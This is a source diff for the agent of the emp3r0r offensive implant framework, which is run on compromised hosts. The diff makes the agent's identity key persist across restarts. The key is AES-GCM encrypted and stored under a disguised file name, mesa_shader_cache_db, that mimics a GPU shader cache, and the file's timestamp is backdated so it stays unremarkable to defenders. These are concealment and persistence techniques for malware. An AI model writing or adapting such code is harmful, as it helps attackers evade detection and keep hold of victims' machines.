@@ -1,6 +1,8 @@
 package agentutils
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/ecdsa"
 	"crypto/elliptic"
 	"crypto/hkdf"
@@ -10,11 +12,13 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"path/filepath"
 	"sync"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 var (
@@ -46,9 +50,17 @@ func AgentPrivateKey() (*ecdsa.PrivateKey, error) {
 	return key, nil
 }
 
-// GetAgentKey generates a random, ephemeral agent key.
+// GetAgentKey generates the agent key, persisting it across restarts.
 // It uses sync.Once to ensure the key persists for the process lifetime
-// (critical for stagers/shellcode stability) but is lost on restart.
+// (critical for stagers/shellcode stability).
+//
+// Key sourcing order:
+//  1. already loaded in-process
+//  2. stager seed (FD 3) — stagers must be deterministic, never touch disk
+//  3. encrypted local cache (see keyCachePath) — survives restarts so the
+//     CC's TOFU pin stays valid and a restart needs no operator-side forget
+//  4. fresh random key (previous behavior; also the fallback when load/save
+//     fails) — its loss re-keys the identity, requiring an operator forget
 func GetAgentKey() error {
 	agentKeyMu.RLock()
 	if AgentKey != nil {
@@ -113,11 +125,28 @@ func GetAgentKey() error {
 			// Ideally stager ALWAYS provides FD 3.
 		}
 
+		// Try the encrypted local cache first: a restart reuses the pinned
+		// identity instead of invalidating it (operator would have to forget).
+		if !keyPersistDisabled() {
+			if cached, loadErr := loadCachedAgentKey(); loadErr == nil && cached != nil {
+				setAgentKey(cached)
+				logging.Infof("Agent key restored from local cache (identity stable across restarts)")
+				return
+			}
+		}
+
 		logging.Infof("Generating ephemeral agent key (PFS enabled)...")
 		generatedKey, keyErr := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
 		err = keyErr
 		if keyErr == nil {
 			setAgentKey(generatedKey)
+			// persist for restarts; failure only means the old behavior
+			// (fresh key per process, operator forgets on restart)
+			if !keyPersistDisabled() {
+				if saveErr := saveCachedAgentKey(generatedKey); saveErr != nil {
+					logging.Debugf("agent key cache: %v", saveErr)
+				}
+			}
 		}
 	})
 
@@ -136,7 +165,123 @@ func RenewAgentKey() error {
 		return fmt.Errorf("failed to renew ephemeral key: %v", err)
 	}
 	setAgentKey(key)
+	// keep the cache in sync — otherwise the next restart resurrects the
+	// OLD key while the CC has already pinned the new one. Note a renewed
+	// key invalidates the CC's TOFU pin either way: an operator forget is
+	// expected after a deliberate rekey.
+	if !keyPersistDisabled() {
+		if saveErr := saveCachedAgentKey(key); saveErr != nil {
+			logging.Debugf("agent key cache: %v", saveErr)
+		}
+	}
 	return nil
+}
+
+// keyCachePath returns the encrypted-identity cache file. A plausible,
+// host-stable path under the user's cache dir: single-file GPU shader
+// cache artifacts of this shape really exist, and the content is AES-GCM
+// ciphertext anyway. 0600 + backdated mtime (util.BackdateFile) keep it
+// unremarkable; the encryption key is derived from the embedded config
+// password + agent UUID, so the blob is useless without the binary.
+func keyCachePath() (string, error) {
+	home, err := os.UserHomeDir()
+	if err != nil || home == "" {
+		home = os.TempDir()
+	}
+	return filepath.Join(home, ".cache", "mesa_shader_cache_db"), nil
+}
+
+// keyCacheKEK derives the file-encryption key from material that is already
+// embedded in the agent: the config password and the agent UUID.
+func keyCacheKEK() ([]byte, error) {
+	if common.RuntimeConfig == nil {
+		return nil, fmt.Errorf("runtime config not ready")
+	}
+	material := common.RuntimeConfig.Password + "|" + common.RuntimeConfig.AgentUUID
+	return hkdf.Key(sha256.New, []byte(material), []byte("emp3r0r-agent-key-cache-v1"), "agent identity persistence", 32)
+}
+
+func keyPersistDisabled() bool {
+	return os.Getenv("EMP_NO_KEY_PERSIST") != ""
+}
+
+// saveCachedAgentKey encrypts the private key (PKCS#8) with AES-GCM and
+// writes it to the cache file with a backdated mtime.
+func saveCachedAgentKey(key *ecdsa.PrivateKey) error {
+	path, err := keyCachePath()
+	if err != nil {
+		return err
+	}
+	kek, err := keyCacheKEK()
+	if err != nil {
+		return err
+	}
+	der, err := x509.MarshalPKCS8PrivateKey(key)
+	if err != nil {
+		return err
+	}
+	block, err := aes.NewCipher(kek)
+	if err != nil {
+		return err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return err
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+		return err
+	}
+	blob := gcm.Seal(nonce, nonce, der, nil)
+	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+		return err
+	}
+	if err := os.WriteFile(path, blob, 0o600); err != nil {
+		return err
+	}
+	util.BackdateFile(path, 20, 180)
+	return nil
+}
+
+// loadCachedAgentKey reads and decrypts the identity cache. Any failure
+// (missing, corrupt, wrong KEK) falls back to a fresh key.
+func loadCachedAgentKey() (*ecdsa.PrivateKey, error) {
+	path, err := keyCachePath()
+	if err != nil {
+		return nil, err
+	}
+	blob, err := os.ReadFile(path)
+	if err != nil {
+		return nil, err
+	}
+	kek, err := keyCacheKEK()
+	if err != nil {
+		return nil, err
+	}
+	block, err := aes.NewCipher(kek)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	if len(blob) < gcm.NonceSize() {
+		return nil, fmt.Errorf("key cache too short")
+	}
+	der, err := gcm.Open(nil, blob[:gcm.NonceSize()], blob[gcm.NonceSize():], nil)
+	if err != nil {
+		return nil, err
+	}
+	parsed, err := x509.ParsePKCS8PrivateKey(der)
+	if err != nil {
+		return nil, err
+	}
+	key, ok := parsed.(*ecdsa.PrivateKey)
+	if !ok {
+		return nil, fmt.Errorf("not an ECDSA key")
+	}
+	return key, nil
 }
 
 // SignWithAgentKey signs data with the agent's unique key
